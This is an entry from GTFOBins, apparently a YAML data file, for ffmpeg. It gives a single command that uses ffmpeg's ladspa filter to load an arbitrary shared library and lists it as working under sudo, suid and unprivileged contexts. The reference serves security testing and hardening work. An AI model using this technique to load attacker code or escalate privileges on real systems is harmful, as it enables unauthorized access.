<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/ffmpeg -->
---
functions:
  library-load:
  - code: |-
      ffmpeg -f lavfi -i anullsrc -af ladspa=file=/path/to/lib.so /path/to/temp-file.wav
      reset^J
    contexts:
      sudo:
      suid:
      unprivileged:
...
